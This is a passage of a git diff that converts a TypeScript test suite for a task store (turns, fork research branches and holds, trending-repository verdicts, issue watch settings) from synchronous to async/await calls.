-			const cancel = store.startTurn(task.id, "work", "p", 222);
-			const done = store.finishTurn(cancel.id, { error: "cancelled" });
+			const cancel = await store.startTurn(task.id, "work", "p", 222);
+			const done = await store.finishTurn(cancel.id, { error: "cancelled" });
 			expect(done.error).toBe("cancelled");
-			expect(store.events().filter((e) => e.kind === "error")).toHaveLength(1);
-			const noop = store.finishTurn(cancel.id, {});
+			expect(
+				(await store.events()).filter((e) => e.kind === "error"),
+			).toHaveLength(1);
+			const noop = await store.finishTurn(cancel.id, {});
 			expect(noop.id).toBe(cancel.id);
-			expect(store.listTurns(task.id)).toHaveLength(2);
-			store.close();
+			expect(await store.listTurns(task.id)).toHaveLength(2);
+			await store.close();
 		});
 
-		test("listTurns returns only the task's turns ordered by id", () => {
-			const store = open(join(root, "ar-list-turns"));
-			const a = store.createTask("a");
-			const b = store.createTask("b");
-			const t1 = store.startTurn(a.id, "work", "p", null);
-			store.startTurn(b.id, "merge", "q", null);
-			const t3 = store.startTurn(a.id, "merge", "r", null);
-			expect(store.listTurns(a.id).map((t) => t.id)).toEqual([t1.id, t3.id]);
-			store.close();
+		test("listTurns returns only the task's turns ordered by id", async () => {
+			const store = await open(join(root, "ar-list-turns"));
+			const a = await store.createTask("a");
+			const b = await store.createTask("b");
+			const t1 = await store.startTurn(a.id, "work", "p", null);
+			await store.startTurn(b.id, "merge", "q", null);
+			const t3 = await store.startTurn(a.id, "merge", "r", null);
+			expect((await store.listTurns(a.id)).map((t) => t.id)).toEqual([
+				t1.id,
+				t3.id,
+			]);
+			await store.close();
 		});
 	});
 
 	describe("perfFacts", () => {
-		test("derives done time from the latest done event, plus cancelled, work turns, and needs_you", () => {
+		test("derives done time from the latest done event, plus cancelled, work turns, and needs_you", async () => {
 			const dir = join(root, "perf-facts");
-			const store = open(dir);
-			const ok = store.createTask("ok");
-			store.updateTask(ok.id, { stage: "in_progress" });
-			store.startTurn(ok.id, "work", "p", null);
-			store.startTurn(ok.id, "merge", "p", null); // a merge turn is not a work turn
-			store.updateTask(ok.id, { stage: "done" });
-			const messy = store.createTask("messy");
-			store.updateTask(messy.id, { state: "needs_you", needsReason: "ask" });
-			store.updateTask(messy.id, { state: "queued", pendingPrompt: "." });
-			store.startTurn(messy.id, "work", "p", null);
-			store.startTurn(messy.id, "work", "p2", null);
-			store.updateTask(messy.id, { stage: "done" });
-			const gone = store.createTask("gone");
-			store.updateTask(gone.id, { cancelledAt: 123 });
-			store.updateTask(gone.id, { stage: "done" });
-			store.close();
-			const reopened = open(dir);
-			const facts = reopened.perfFacts().tasks;
+			const store = await open(dir);
+			const ok = await store.createTask("ok");
+			await store.updateTask(ok.id, { stage: "in_progress" });
+			await store.startTurn(ok.id, "work", "p", null);
+			await store.startTurn(ok.id, "merge", "p", null); // a merge turn is not a work turn
+			await store.updateTask(ok.id, { stage: "done" });
+			const messy = await store.createTask("messy");
+			await store.updateTask(messy.id, {
+				state: "needs_you",
+				needsReason: "ask",
+			});
+			await store.updateTask(messy.id, { state: "queued", pendingPrompt: "." });
+			await store.startTurn(messy.id, "work", "p", null);
+			await store.startTurn(messy.id, "work", "p2", null);
+			await store.updateTask(messy.id, { stage: "done" });
+			const gone = await store.createTask("gone");
+			await store.updateTask(gone.id, { cancelledAt: 123 });
+			await store.updateTask(gone.id, { stage: "done" });
+			await store.close();
+			const reopened = await open(dir);
+			const facts = (await reopened.perfFacts()).tasks;
 			expect(facts).toHaveLength(3);
 			// Identify each card by its fact shape, not by order.
 			const okFacts = facts.find((f) => f.workTurns === 1 && !f.cancelled)!;
@@ -3405,18 +3669,18 @@ describe("arch-review changed-line coverage", () => {
 			expect(messyFacts.doneAt).not.toBeNull();
 			const goneFacts = facts.find((f) => f.cancelled)!;
 			expect(goneFacts.doneAt).not.toBeNull(); // perfMetrics filters it by `cancelled`
-			reopened.close();
+			await reopened.close();
 		});
 
-		test("doneAt is the latest stage→done event, not the first", () => {
+		test("doneAt is the latest stage→done event, not the first", async () => {
 			const dir = join(root, "perf-done-at");
-			const store = open(dir);
-			const t = store.createTask("done twice");
-			store.updateTask(t.id, { stage: "in_progress" });
-			store.updateTask(t.id, { stage: "done" });
-			store.updateTask(t.id, { stage: "in_progress" });
-			store.updateTask(t.id, { stage: "done" });
-			store.close();
+			const store = await open(dir);
+			const t = await store.createTask("done twice");
+			await store.updateTask(t.id, { stage: "in_progress" });
+			await store.updateTask(t.id, { stage: "done" });
+			await store.updateTask(t.id, { stage: "in_progress" });
+			await store.updateTask(t.id, { stage: "done" });
+			await store.close();
 			// The two done events can share one millisecond: pin them apart by rowid.
 			const raw = new Database(join(dir, ".tasks", "tasks.db"));
 			raw.run(
@@ -3426,31 +3690,31 @@ describe("arch-review changed-line coverage", () => {
 				"UPDATE events SET at = 2000 WHERE id = (SELECT MAX(id) FROM events WHERE to_value = 'done')",
 			);
 			raw.close();
-			const facts = open(dir).perfFacts();
+			const facts = await (await open(dir)).perfFacts();
 			expect(facts.tasks).toHaveLength(1);
 			expect(facts.tasks[0]?.doneAt).toBe(2000);
 		});
 
-		test("turn failure flags follow error and exit_code with SQL NULL semantics", () => {
+		test("turn failure flags follow error and exit_code with SQL NULL semantics", async () => {
 			const dir = join(root, "perf-failed");
-			const store = open(dir);
-			const t = store.createTask("flags");
-			const boom = store.startTurn(t.id, "work", "p", null);
-			store.finishTurn(boom.id, { endedAt: 100, error: "boom" });
-			const cancel = store.startTurn(t.id, "work", "p", null);
-			store.finishTurn(cancel.id, { endedAt: 200, error: "cancelled" });
-			const crashed = store.startTurn(t.id, "work", "p", null);
-			store.finishTurn(crashed.id, { endedAt: 300, exitCode: 3 });
-			const clean = store.startTurn(t.id, "work", "p", null);
-			store.finishTurn(clean.id, { endedAt: 400, exitCode: 0 });
-			store.close();
+			const store = await open(dir);
+			const t = await store.createTask("flags");
+			const boom = await store.startTurn(t.id, "work", "p", null);
+			await store.finishTurn(boom.id, { endedAt: 100, error: "boom" });
+			const cancel = await store.startTurn(t.id, "work", "p", null);
+			await store.finishTurn(cancel.id, { endedAt: 200, error: "cancelled" });
+			const crashed = await store.startTurn(t.id, "work", "p", null);
+			await store.finishTurn(crashed.id, { endedAt: 300, exitCode: 3 });
+			const clean = await store.startTurn(t.id, "work", "p", null);
+			await store.finishTurn(clean.id, { endedAt: 400, exitCode: 0 });
+			await store.close();
 			// A finished turn with NULL error and NULL exit_code is not failed either.
 			const raw = new Database(join(dir, ".tasks", "tasks.db"));
 			raw.run("UPDATE turns SET exit_code = NULL WHERE ended_at = 400");
 			raw.close();
-			const turns = open(dir)
-				.perfFacts()
-				.turns.sort((a, b) => a.endedAt - b.endedAt);
+			const turns = (await (await open(dir)).perfFacts()).turns.sort(
+				(a, b) => a.endedAt - b.endedAt,
+			);
 			expect(turns).toEqual([
 				{ endedAt: 100, failed: true, cost: null },
 				{ endedAt: 200, failed: false, cost: null },
@@ -3459,31 +3723,34 @@ describe("arch-review changed-line coverage", () => {
 			]);
 		});
 
-		test("turnDurations returns completed turns only, with null model kept and glitch rows dropped", () => {
+		test("turnDurations returns completed turns only, with null model kept and glitch rows dropped", async () => {
 			const dir = join(root, "turn-durations");
-			const store = open(dir);
-			const t = store.createTask("timed");
+			const store = await open(dir);
+			const t = await store.createTask("timed");
 			// Two completed turns with real durations, one with the default (null) model.
-			const a = store.startTurn(t.id, "work", "p", null);
-			store.finishTurn(a.id, { endedAt: a.startedAt + 1000, model: "a/one" });
-			const b = store.startTurn(t.id, "merge", "p", null);
-			store.finishTurn(b.id, { endedAt: b.startedAt + 3000 });
+			const a = await store.startTurn(t.id, "work", "p", null);
+			await store.finishTurn(a.id, {
+				endedAt: a.startedAt + 1000,
+				model: "a/one",
+			});
+			const b = await store.startTurn(t.id, "merge", "p", null);
+			await store.finishTurn(b.id, { endedAt: b.startedAt + 3000 });
 			// A still-open turn is not a duration sample.
-			store.startTurn(t.id, "work", "p", null);
+			await store.startTurn(t.id, "work", "p", null);
 			// A stamp glitch (ended before it started) is filtered, not shipped.
-			const glitch = store.startTurn(t.id, "work", "p", null);
+			const glitch = await store.startTurn(t.id, "work", "p", null);
 			const glitchEnd = glitch.startedAt + 500;
-			store.finishTurn(glitch.id, { endedAt: glitchEnd });
-			store.close();
+			await store.finishTurn(glitch.id, { endedAt: glitchEnd });
+			await store.close();
 			const raw = new Database(join(dir, ".tasks", "tasks.db"));
 			raw.run(
 				"UPDATE turns SET started_at = ended_at + 2000 WHERE ended_at = ?",
 				[glitchEnd],
 			);
 			raw.close();
-			const rows = open(dir)
-				.turnDurations()
-				.sort((x, y) => x.ms - y.ms);
+			const rows = (await (await open(dir)).turnDurations()).sort(
+				(x, y) => x.ms - y.ms,
+			);
 			expect(rows).toEqual([
 				{ kind: "work", model: "a/one", ms: 1000 },
 				{ kind: "merge", model: null, ms: 3000 },
@@ -3492,7 +3759,7 @@ describe("arch-review changed-line coverage", () => {
 	});
 
 	describe("lifecycle helpers", () => {
-		test("tasksDirFor without OTTR_DATA_DIR points into the checkout", () => {
+		test("tasksDirFor without OTTR_DATA_DIR points into the checkout", async () => {
 			const saved = process.env.OTTR_DATA_DIR;
 			delete process.env.OTTR_DATA_DIR;
 			try {
@@ -3502,32 +3769,32 @@ describe("arch-review changed-line coverage", () => {
 			}
 		});
 
-		test("a double close is a no-op and the store reopens cleanly", () => {
+		test("a double close is a no-op and the store reopens cleanly", async () => {
 			const dir = join(root, "ar-double-close");
-			const store = open(dir);
-			store.close();
-			store.close();
-			expect(open(dir).listTasks()).toEqual([]);
+			const store = await open(dir);
+			await store.close();
+			await store.close();
+			expect(await (await open(dir)).listTasks()).toEqual([]);
 		});
 	});
 
 	describe("task ids", () => {
-		test("new ids are PREFIX-n keys derived from the store folder name, consecutive", () => {
-			const store = open(join(root, "my_repo"));
-			const a = store.createTask("a");
-			const b = store.createTask("b");
+		test("new ids are PREFIX-n keys derived from the store folder name, consecutive", async () => {
+			const store = await open(join(root, "my_repo"));
+			const a = await store.createTask("a");
+			const b = await store.createTask("b");
 			expect(a.id).toMatch(/^[A-Z0-9]{1,4}-[0-9]+$/);
 			expect(a.id).toBe("MYRE-1");
 			expect(b.id).toBe("MYRE-2");
 		});
 
-		test("an explicit id skips the counter; a taken one gets -2, -3, ...", () => {
+		test("an explicit id skips the counter; a taken one gets -2, -3, ...", async () => {
 			const dir = join(root, "explicit-id");
-			const store = open(dir);
-			store.setSettings({ taskIdPrefix: "RTR" });
-			const source = store.createTask("source card");
+			const store = await open(dir);
+			await store.setSettings({ taskIdPrefix: "RTR" });
+			const source = await store.createTask("source card");
 			expect(source.id).toBe("RTR-1");
-			const retro = store.createTask(
+			const retro = await store.createTask(
 				"retro prompt",
 				null,
 				"retro",
@@ -3535,7 +3802,7 @@ describe("arch-review changed-line coverage", () => {
 			);
 			expect(retro.id).toBe("RTR-1-retro");
 			// A second retro for the same card: the id is taken, so -retro-2. No reuse.
-			const retro2 = store.createTask(
+			const retro2 = await store.createTask(
 				"retro prompt",
 				null,
 				"retro",
@@ -3543,42 +3810,44 @@ describe("arch-review changed-line coverage", () => {
 			);
 			expect(retro2.id).toBe("RTR-1-retro-2");
 			// The retro ids consumed no counter value: the next card takes the next number.
-			expect(store.createTask("next card").id).toBe("RTR-2");
+			expect((await store.createTask("next card")).id).toBe("RTR-2");
 			// An empty explicit id is a caller bug, not an idless card.
-			expect(() => store.createTask("x", null, "work", "")).toThrow();
-			store.close();
+			await expect(store.createTask("x", null, "work", "")).rejects.toThrow();
+			await store.close();
 		});
 
-		test("taskIdPrefix overrides the derived handle; null returns to it; the counter never resets", () => {
+		test("taskIdPrefix overrides the derived handle; null returns to it; the counter never resets", async () => {
 			const dir = join(root, "chs-override");
-			const store = open(dir);
-			expect(store.createTask("a").id).toBe("CHSO-1");
-			store.setSettings({ taskIdPrefix: "chs" });
-			expect(store.createTask("b").id).toBe("CHS-2");
+			const store = await open(dir);
+			expect((await store.createTask("a")).id).toBe("CHSO-1");
+			await store.setSettings({ taskIdPrefix: "chs" });
+			expect((await store.createTask("b")).id).toBe("CHS-2");
 			// Defensive normalization: a stored lowercase value still yields uppercase ids.
-			store.setSettings({ taskIdPrefix: "zz" });
-			expect(store.createTask("c").id).toBe("ZZ-3");
-			store.setSettings({ taskIdPrefix: null });
-			expect(store.createTask("d").id).toBe("CHSO-4");
+			await store.setSettings({ taskIdPrefix: "zz" });
+			expect((await store.createTask("c")).id).toBe("ZZ-3");
+			await store.setSettings({ taskIdPrefix: null });
+			expect((await store.createTask("d")).id).toBe("CHSO-4");
 		});
 
-		test("getTask still resolves a legacy 8-hex id", () => {
+		test("getTask still resolves a legacy 8-hex id", async () => {
 			const dir = join(root, "legacy-id");
-			const store = open(dir);
-			const task = store.createTask("legacy");
-			store.close();
+			const store = await open(dir);
+			const task = await store.createTask("legacy");
+			await store.close();
 			const legacyId = "abcdef12";
 			const raw = new Database(join(dir, ".tasks", "tasks.db"));
 			raw.run("UPDATE tasks SET id = ? WHERE id = ?", [legacyId, task.id]);
 			raw.close();
-			expect(open(dir).getTask(legacyId)?.prompt).toBe("legacy");
+			expect((await (await open(dir)).getTask(legacyId))?.prompt).toBe(
+				"legacy",
+			);
 		});
 	});
 });
 
 describe("fork research store methods", () => {
-	test("saveForkBranch/listForkBranches round-trip and upsert", () => {
-		const store = open(join(root, "fork-branch"));
+	test("saveForkBranch/listForkBranches round-trip and upsert", async () => {
+		const store = await open(join(root, "fork-branch"));
 		const row = {
 			forkId: 1,
 			branchHash: "h1",
@@ -3590,30 +3859,30 @@ describe("fork research store methods", () => {
 			lastError: null,
 			retries: 0,
 		};
-		store.saveForkBranch(row);
-		store.saveForkBranch({
+		await store.saveForkBranch(row);
+		await store.saveForkBranch({
 			...row,
 			head: "def",
 			retries: 2,
 			lastError: "boom",
 		});
-		expect(store.listForkBranches(1)).toEqual([
+		expect(await store.listForkBranches(1)).toEqual([
 			{ ...row, head: "def", retries: 2, lastError: "boom" },
 		]);
-		expect(store.listAllForkBranches()).toHaveLength(1);
+		expect(await store.listAllForkBranches()).toHaveLength(1);
 	});
 
-	test("forkRunsSince counts recorded runs", () => {
-		const store = open(join(root, "fork-runs"));
-		store.recordForkRun(1, 1000);
-		store.recordForkRun(1, 2000);
-		expect(store.forkRunsSince(1500)).toBe(1);
-		expect(store.forkRunsSince(0)).toBe(2);
+	test("forkRunsSince counts recorded runs", async () => {
+		const store = await open(join(root, "fork-runs"));
+		await store.recordForkRun(1, 1000);
+		await store.recordForkRun(1, 2000);
+		expect(await store.forkRunsSince(1500)).toBe(1);
+		expect(await store.forkRunsSince(0)).toBe(2);
 	});
 
-	test("createForkResult files card, proposals, and analyzed heads in one transaction", () => {
-		const store = open(join(root, "fork-result"));
-		store.saveForkBranch({
+	test("createForkResult files card, proposals, and analyzed heads in one transaction", async () => {
+		const store = await open(join(root, "fork-result"));
+		await store.saveForkBranch({
 			forkId: 7,
 			branchHash: "h1",
 			branch: "feat-a",
@@ -3624,7 +3893,7 @@ describe("fork research store methods", () => {
 			lastError: "earlier failure",
 			retries: 2,
 		});
-		const card = store.createForkResult({
+		const card = await store.createForkResult({
 			prompt: "report prompt",
 			title: "Fork research: 2026-10-14",
 			report: "# findings",
@@ -3642,15 +3911,14 @@ describe("fork research store methods", () => {
 				},
 			],
 		});
-		const stored = store.getTask(card.id)!;
+		const stored = (await store.getTask(card.id))!;
 		expect(stored.research).toBe(true);
 		expect(stored.stage).toBe("done");
 		expect(stored.state).toBe("idle");
 		expect(stored.topic).toBe("fork research");
 		expect(stored.report).toBe("# findings");
 		expect(stored.title).toBe("Fork research: 2026-10-14");
-		const kids = store
-			.listTasks()
+		const kids = (await store.listTasks())
 			.filter((t) => t.followUpOf === card.id)
 			.sort((a, b) => a.prompt.localeCompare(b.prompt));
 		expect(kids).toHaveLength(2);
@@ -3661,7 +3929,7 @@ describe("fork research store methods", () => {
 			);
 		}
 		expect(kids[1]!.model).toBe("m");
-		const branch = store.listForkBranches(7)[0]!;
+		const branch = (await store.listForkBranches(7))[0]!;
 		expect(branch.analyzedHead).toBe("abc");
 		expect(branch.firstPendingAt).toBeNull();
 		expect(branch.lastRunAt).toBe(42);
@@ -3671,7 +3939,7 @@ describe("fork research store methods", () => {
 });
 
 describe("fork hold store", () => {
-	test("a legacy database without the table converges on open", () => {
+	test("a legacy database without the table converges on open", async () => {
 		const dir = join(root, "fork-hold-legacy");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
@@ -3692,12 +3960,12 @@ describe("fork hold store", () => {
 			"INSERT INTO fork_branch (fork_id, branch_hash, branch, head, analyzed_head) VALUES (1, 'h1', 'feat', 'abc', NULL)",
 		);
 		db.close();
-		const store = open(dir);
-		expect(store.listForkHolds(1)).toEqual([]);
-		store.setForkHolds(1, "h1", [
+		const store = await open(dir);
+		expect(await store.listForkHolds(1)).toEqual([]);
+		await store.setForkHolds(1, "h1", [
 			{ sha: "a".repeat(40), pr: 5, prHead: "b".repeat(40), released: false },
 		]);
-		expect(store.listForkHolds(1)).toEqual([
+		expect(await store.listForkHolds(1)).toEqual([
 			{
 				forkId: 1,
 				branchHash: "h1",
@@ -3707,19 +3975,19 @@ describe("fork hold store", () => {
 				released: 0,
 			},
 		]);
-		store.close();
+		await store.close();
 	});
 
-	test("setForkHolds replaces the branch's rows", () => {
-		const store = open(join(root, "fork-hold-replace"));
-		store.setForkHolds(1, "h1", [
+	test("setForkHolds replaces the branch's rows", async () => {
+		const store = await open(join(root, "fork-hold-replace"));
+		await store.setForkHolds(1, "h1", [
 			{ sha: "a".repeat(40), pr: 5, prHead: "b".repeat(40), released: false },
 			{ sha: "c".repeat(40), pr: 5, prHead: "b".repeat(40), released: true },
 		]);
-		store.setForkHolds(1, "h1", [
+		await store.setForkHolds(1, "h1", [
 			{ sha: "c".repeat(40), pr: 6, prHead: "d".repeat(40), released: true },
 		]);
-		expect(store.listForkHolds(1)).toEqual([
+		expect(await store.listForkHolds(1)).toEqual([
 			{
 				forkId: 1,
 				branchHash: "h1",
@@ -3729,28 +3997,28 @@ describe("fork hold store", () => {
 				released: 1,
 			},
 		]);
-		store.close();
+		await store.close();
 	});
 
-	test("deleteForkBranchesNotIn prunes holds of absent forks and clears all on empty ids", () => {
-		const store = open(join(root, "fork-hold-prune"));
-		store.setForkHolds(1, "h1", [
+	test("deleteForkBranchesNotIn prunes holds of absent forks and clears all on empty ids", async () => {
+		const store = await open(join(root, "fork-hold-prune"));
+		await store.setForkHolds(1, "h1", [
 			{ sha: "a".repeat(40), pr: 5, prHead: "b".repeat(40), released: false },
 		]);
-		store.setForkHolds(2, "h2", [
+		await store.setForkHolds(2, "h2", [
 			{ sha: "c".repeat(40), pr: 6, prHead: "d".repeat(40), released: false },
 		]);
-		store.deleteForkBranchesNotIn([1]);
-		expect(store.listForkHolds(2)).toEqual([]);
-		expect(store.listForkHolds(1)).toHaveLength(1);
-		store.deleteForkBranchesNotIn([]);
-		expect(store.listForkHolds(1)).toEqual([]);
-		store.close();
+		await store.deleteForkBranchesNotIn([1]);
+		expect(await store.listForkHolds(2)).toEqual([]);
+		expect(await store.listForkHolds(1)).toHaveLength(1);
+		await store.deleteForkBranchesNotIn([]);
+		expect(await store.listForkHolds(1)).toEqual([]);
+		await store.close();
 	});
 
-	test("createForkResult deletes consumed hold rows in-transaction and leaves the rest", () => {
-		const store = open(join(root, "fork-hold-consume"));
-		store.saveForkBranch({
+	test("createForkResult deletes consumed hold rows in-transaction and leaves the rest", async () => {
+		const store = await open(join(root, "fork-hold-consume"));
+		await store.saveForkBranch({
 			forkId: 7,
 			branchHash: "h1",
 			branch: "feat-a",
@@ -3761,11 +4029,11 @@ describe("fork hold store", () => {
 			lastError: null,
 			retries: 0,
 		});
-		store.setForkHolds(7, "h1", [
+		await store.setForkHolds(7, "h1", [
 			{ sha: "a".repeat(40), pr: 5, prHead: "b".repeat(40), released: true },
 			{ sha: "c".repeat(40), pr: 5, prHead: "b".repeat(40), released: true },
 		]);
-		store.createForkResult({
+		await store.createForkResult({
 			prompt: "report prompt",
 			title: "Fork research",
 			report: "# findings",
@@ -3781,7 +4049,7 @@ describe("fork hold store", () => {
 				},
 			],
 		});
-		expect(store.listForkHolds(7)).toEqual([
+		expect(await store.listForkHolds(7)).toEqual([
 			{
 				forkId: 7,
 				branchHash: "h1",
@@ -3791,20 +4059,20 @@ describe("fork hold store", () => {
 				released: 1,
 			},
 		]);
-		expect(store.listForkBranches(7)[0]!.analyzedHead).toBe("abc");
-		store.close();
+		expect((await store.listForkBranches(7))[0]!.analyzedHead).toBe("abc");
+		await store.close();
 	});
 });
 
 describe("trending verdicts", () => {
-	const scoutOf = (store: ProjectStore) =>
-		store.createTask("scan trending", null, "trending");
+	const scoutOf = async (store: ProjectStore) =>
+		await store.createTask("scan trending", null, "trending");
 
-	test("a proposal lands in backlog, idle, under the scout; the 4th filing hits the cap", () => {
-		const store = open(join(root, "trending-cap"));
-		const scout = scoutOf(store);
+	test("a proposal lands in backlog, idle, under the scout; the 4th filing hits the cap", async () => {
+		const store = await open(join(root, "trending-cap"));
+		const scout = await scoutOf(store);
 		for (const repo of ["a/one", "B/Two", "c/three"]) {
-			const res = store.fileTrendingProposal({
+			const res = await store.fileTrendingProposal({
 				scoutId: scout.id,
 				repo,
 				prompt: `adopt ${repo}`,
@@ -3816,13 +4084,13 @@ describe("trending verdicts", () => {
 			expect(res.task.state).toBe("idle");
 			expect(res.task.queuedAt).toBeNull();
 			expect(res.task.followUpOf).toBe(scout.id);
-			const v = store.trendingVerdictByProposal(res.task.id);
+			const v = await store.trendingVerdictByProposal(res.task.id);
 			expect(v?.repo).toBe(repo.toLowerCase());
 			expect(v?.verdict).toBe("filed");
 			expect(v?.scoutCardId).toBe(scout.id);
 		}
 		expect(
-			store.fileTrendingProposal({
+			await store.fileTrendingProposal({
 				scoutId: scout.id,
 				repo: "d/four",
 				prompt: "adopt d/four",
@@ -3833,15 +4101,15 @@ describe("trending verdicts", () => {
 			error:
 				"cap of 3 proposals per scan reached: record d/four as deferred instead",
 		});
-		expect(store.getTrendingVerdict("d/four")).toBeNull();
+		expect(await store.getTrendingVerdict("d/four")).toBeNull();
 	});
 
-	test("final verdicts are never overwritten; deferred can be re-judged and keeps firstSeenAt", () => {
-		const store = open(join(root, "trending-final"));
-		const scout = scoutOf(store);
+	test("final verdicts are never overwritten; deferred can be re-judged and keeps firstSeenAt", async () => {
+		const store = await open(join(root, "trending-final"));
+		const scout = await scoutOf(store);
 		const id = scout.id;
 		expect(
-			store.judgeTrendingRepo({
+			await store.judgeTrendingRepo({
 				scoutId: id,
 				repo: "x/no",
 				verdict: "no_fit",
@@ -3849,7 +4117,7 @@ describe("trending verdicts", () => {
 			}),
 		).toEqual({ ok: true });
 		expect(
-			store.judgeTrendingRepo({
+			await store.judgeTrendingRepo({
 				scoutId: id,
 				repo: "X/No",
 				verdict: "deferred",
@@ -3860,7 +4128,7 @@ describe("trending verdicts", () => {
 			error: "x/no already has a final verdict (no_fit)",
 		});
 		expect(
-			store.fileTrendingProposal({
+			await store.fileTrendingProposal({
 				scoutId: id,
 				repo: "x/no",
 				prompt: "p",
@@ -3870,7 +4138,7 @@ describe("trending verdicts", () => {
 			ok: false,
 			error: "x/no already has a final verdict (no_fit)",
 		});
-		const filed = store.fileTrendingProposal({
+		const filed = await store.fileTrendingProposal({
 			scoutId: id,
 			repo: "x/yes",
 			prompt: "p",
@@ -3878,7 +4146,7 @@ describe("trending verdicts", () => {
 		});
 		expect(filed.ok).toBe(true);
 		expect(
-			store.judgeTrendingRepo({
+			await store.judgeTrendingRepo({
 				scoutId: id,
 				repo: "x/yes",
 				verdict: "no_fit",
@@ -3890,7 +4158,7 @@ describe("trending verdicts", () => {
 		});
 
 		expect(
-			store.judgeTrendingRepo({
+			await store.judgeTrendingRepo({
 				scoutId: id,
 				repo: "x/later",
 				verdict: "deferred",
@@ -3899,7 +4167,7 @@ describe("trending verdicts", () => {
 			}),
 		).toEqual({ ok: true });
 		expect(
-			store.judgeTrendingRepo({
+			await store.judgeTrendingRepo({
 				scoutId: id,
 				repo: "x/later",
 				verdict: "no_fit",
@@ -3907,74 +4175,78 @@ describe("trending verdicts", () => {
 				now: 9,
 			}),
 		).toEqual({ ok: true });
-		const v = store.getTrendingVerdict("x/later");
+		const v = await store.getTrendingVerdict("x/later");
 		expect(v?.verdict).toBe("no_fit");
 		expect(v?.firstSeenAt).toBe(5);
 		expect(v?.judgedAt).toBe(9);
 		expect(
-			store.judgeTrendingRepo({
-				scoutId: id,
-				repo: "x/blank",
-				verdict: "deferred",
-				reason: "  ",
-			}).ok,
+			(
+				await store.judgeTrendingRepo({
+					scoutId: id,
+					repo: "x/blank",
+					verdict: "deferred",
+					reason: "  ",
+				})
+			).ok,
 		).toBe(false);
 	});
 
-	test("reject turns a filed proposal into a user no_fit, once", () => {
-		const store = open(join(root, "trending-reject"));
-		const scout = scoutOf(store);
-		const res = store.fileTrendingProposal({
+	test("reject turns a filed proposal into a user no_fit, once", async () => {
+		const store = await open(join(root, "trending-reject"));
+		const scout = await scoutOf(store);
+		const res = await store.fileTrendingProposal({
 			scoutId: scout.id,
 			repo: "o/r",
 			prompt: "p",
 			cap: 3,
 		});
 		if (!res.ok) throw new Error(res.error);
-		expect(store.rejectTrendingProposal(res.task.id, "  too heavy  ", 77)).toBe(
-			true,
-		);
-		const v = store.getTrendingVerdict("o/r");
+		expect(
+			await store.rejectTrendingProposal(res.task.id, "  too heavy  ", 77),
+		).toBe(true);
+		const v = await store.getTrendingVerdict("o/r");
 		expect(v?.verdict).toBe("no_fit");
 		expect(v?.rejectedByUser).toBe(true);
 		expect(v?.reason).toBe("too heavy");
 		expect(v?.judgedAt).toBe(77);
-		expect(store.rejectTrendingProposal(res.task.id, "other", 99)).toBe(false);
-		expect(store.getTrendingVerdict("o/r")).toEqual(v);
-		expect(store.rejectTrendingProposal("nope-1", null)).toBe(false);
+		expect(await store.rejectTrendingProposal(res.task.id, "other", 99)).toBe(
+			false,
+		);
+		expect(await store.getTrendingVerdict("o/r")).toEqual(v);
+		expect(await store.rejectTrendingProposal("nope-1", null)).toBe(false);
 
-		const res2 = store.fileTrendingProposal({
+		const res2 = await store.fileTrendingProposal({
 			scoutId: scout.id,
 			repo: "o/s",
 			prompt: "p",
 			cap: 3,
 		});
 		if (!res2.ok) throw new Error(res2.error);
-		expect(store.rejectTrendingProposal(res2.task.id, null)).toBe(true);
-		expect(store.getTrendingVerdict("o/s")?.reason).toBe(
+		expect(await store.rejectTrendingProposal(res2.task.id, null)).toBe(true);
+		expect((await store.getTrendingVerdict("o/s"))?.reason).toBe(
 			"Rejected by the user (no reason given)",
 		);
 	});
 
-	test("a non-trending or cancelled scout card is refused", () => {
-		const store = open(join(root, "trending-scout"));
-		const work = store.createTask("plain work");
+	test("a non-trending or cancelled scout card is refused", async () => {
+		const store = await open(join(root, "trending-scout"));
+		const work = await store.createTask("plain work");
 		const err = {
 			ok: false as const,
 			error: "not an open trending scout card",
 		};
 		expect(
-			store.fileTrendingProposal({
+			await store.fileTrendingProposal({
 				scoutId: work.id,
 				repo: "a/b",
 				prompt: "p",
 				cap: 3,
 			}),
 		).toEqual(err);
-		const scout = scoutOf(store);
-		store.updateTask(scout.id, { cancelledAt: 1 });
+		const scout = await scoutOf(store);
+		await store.updateTask(scout.id, { cancelledAt: 1 });
 		expect(
-			store.judgeTrendingRepo({
+			await store.judgeTrendingRepo({
 				scoutId: scout.id,
 				repo: "a/b",
 				verdict: "deferred",
@@ -3982,45 +4254,47 @@ describe("trending verdicts", () => {
 			}),
 		).toEqual(err);
 		expect(
-			store.fileTrendingProposal({
+			await store.fileTrendingProposal({
 				scoutId: "missing-1",
 				repo: "a/b",
 				prompt: "p",
 				cap: 3,
 			}),
 		).toEqual(err);
-		const live = scoutOf(store);
+		const live = await scoutOf(store);
 		expect(
-			store.judgeTrendingRepo({
-				scoutId: live.id,
-				repo: "not a repo",
-				verdict: "deferred",
-				reason: "r",
-			}).ok,
+			(
+				await store.judgeTrendingRepo({
+					scoutId: live.id,
+					repo: "not a repo",
+					verdict: "deferred",
+					reason: "r",
+				})
+			).ok,
 		).toBe(false);
-		expect(store.listTrendingVerdicts()).toEqual([]);
+		expect(await store.listTrendingVerdicts()).toEqual([]);
 	});
 });
 
 describe("issue watch store methods", () => {
-	test("settings default off and issueWatchSince round-trips a number", () => {
+	test("settings default off and issueWatchSince round-trips a number", async () => {
 		const dir = join(root, "issue-settings");
-		let store = open(dir);
+		let store = await open(dir);
 		expect(DEFAULT_SETTINGS.issueWatch).toBe(false);
-		expect(store.getSettings().issueWatch).toBe(false);
-		expect(store.getSettings().issueWatchSince).toBeNull();
+		expect((await store.getSettings()).issueWatch).toBe(false);
+		expect((await store.getSettings()).issueWatchSince).toBeNull();
 		const since = 1_700_000_000_000;
-		store.setSettings({ issueWatch: true, issueWatchSince: since });
-		store.close();
-		store = open(dir);
-		expect(store.getSettings().issueWatch).toBe(true);
-		expect(store.getSettings().issueWatchSince).toBe(since);
-		store.close();
+		await store.setSettings({ issueWatch: true, issueWatchSince: since });
+		await store.close();
+		store = await open(dir);
+		expect((await store.getSettings()).issueWatch).toBe(true);
+		expect((await store.getSettings()).issueWatchSince).toBe(since);
+		await store.close();
 	});
 
-	test("fileIssueCard files an idle backlog work card and an unlabelled row", () => {
-		const store = open(join(root, "issue-file"));
-		const card = store.fileIssueCard({
+	test("fileIssueCard files an idle backlog work card and an unlabelled row", async () => {
+		const store = await open(join(root, "issue-file"));
+		const card = await store.fileIssueCard({
 			number: 7,
 			title: "Crash on start",
 			prompt: "Fix GitHub issue #7",
